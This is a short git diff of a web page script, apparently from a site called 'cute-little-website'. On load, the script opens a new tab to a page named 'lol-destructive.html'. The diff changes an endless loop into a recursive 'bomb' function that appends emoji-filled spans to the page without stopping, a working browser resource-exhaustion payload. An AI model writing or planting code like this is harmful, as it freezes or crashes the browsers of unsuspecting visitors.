@@ -8,10 +8,11 @@
   window.open("https://little-code49.github.io/cute-little-website/lol-destructive.html", '_blank');
         // Your script code here
         console.log('DOM fully loaded and parsed');
-        while (true){
+      function bomb() {
       const e = document.createElement("span");
       e.textContent = "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥";
       document.body.appendChild(e);
-    
-    }
+      setTimeout(bomb, 0);
+    }  
+    bomb()
 </script>
